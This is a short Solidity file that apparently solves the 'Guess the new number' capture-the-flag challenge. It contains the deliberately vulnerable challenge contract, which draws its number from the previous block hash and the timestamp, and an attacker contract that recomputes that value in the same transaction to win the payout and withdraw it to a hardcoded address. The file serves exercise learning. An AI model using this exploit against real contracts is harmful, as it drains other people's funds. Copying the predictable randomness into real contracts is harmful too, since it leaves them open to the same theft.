pragma solidity ^0.4.21;

/**
    The guesser contract execute the same method to generate the number and pass it to the challenge contract
 */
contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract GuesserNewNumber {
    address challengeContract = 0x9bcB868F01615F7EEEF9F6b821C3C2c88fBb0f34;
    address  myAddress = 0xEc948CC31227f0359717c69489cEe7BE7aEFbFD1;
    function guessTheNumber() public payable {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        GuessTheNewNumberChallenge(challengeContract).guess.value(msg.value)(answer);
    }

    function withdraw() external {
        myAddress.transfer(address(this).balance);
    }
    
    function() external payable {
    }
}